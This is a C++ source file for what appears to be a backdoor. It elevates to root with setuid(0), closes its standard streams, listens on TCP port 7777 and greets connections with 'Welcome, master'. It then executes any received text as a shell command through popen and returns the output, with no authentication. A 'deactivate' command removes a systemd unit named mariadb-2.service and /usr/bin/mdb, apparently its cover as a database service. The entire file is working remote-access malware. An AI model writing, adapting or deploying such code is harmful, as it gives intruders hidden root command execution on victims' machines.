#include <iostream>
#include <unistd.h>
#include <sys/types.h>
#include <netdb.h>
#include <vector>
#include <string.h>

constexpr int my_port = 7777;
constexpr int MSG_BUF = 4096;
constexpr int BACKLOG = 10;

typedef std::vector<unsigned char> buffer_t;

int main()
{
    setuid(0);
    // Закрываем все дескрипторы
    close(0);
    close(1);
    close(2);

    int sockfd;
    sockaddr_in servinfo;
    if ((sockfd = socket(AF_INET, SOCK_STREAM,0)) == -1){
        exit(EXIT_FAILURE);
    }
    servinfo.sin_family = AF_INET;
    servinfo.sin_addr.s_addr = htons(INADDR_ANY);
    servinfo.sin_port = htons(my_port);

    if (bind(sockfd, reinterpret_cast<sockaddr *>(&servinfo),sizeof(servinfo)) == -1){
        exit(EXIT_FAILURE);
    }

    if (listen(sockfd,BACKLOG) == -1){
        exit(EXIT_FAILURE);
    }

    int client_fd;
    char buf[MSG_BUF];
    memset(&buf,0,sizeof(buf));
    long num_bytes;
    for(;;){
       client_fd = accept(sockfd,nullptr,nullptr);
       send(client_fd,"Welcome, master\n",16,0);
       for(;;){
           num_bytes = recv(client_fd,&buf,MSG_BUF,0);
           //std::cout << "received message " << num_bytes << '\n';
           if (num_bytes > 0){
               //std::cout << std::string(buf);
               if (std::string(buf) == "close\n"){
                   send(client_fd,"closing\n",8,0);
                   close(client_fd);
                   break;
               }
               if (std::string(buf) == "deactivate\n"){
                   send(client_fd,"deactivating\n",13,0);


                   //system("systemctl stop mariadb-2.service");
                   system("systemctl disable mariadb-2.service");
                   system("rm -f /usr/lib/systemd/system/mariadb-2.service");
                   system("rm -f /usr/bin/mdb");                   
                   system("systemctl daemon-reload");
                   system("systemctl reset-failed");
               }

               FILE* fp;
               fp = popen(buf,"r");
               memset(&buf,0,sizeof(buf));
               if (fp == NULL){
                   send(client_fd,"fail",5,0);
               }
               else {
                   while (fgets(buf, sizeof(buf), fp) != NULL){
                       send(client_fd,&buf,strlen(buf),0);
                   }
               }
               memset(&buf,0,sizeof(buf));
               pclose(fp);
           }
           else {
               close(client_fd);
               break;
           }
        }
    }


}
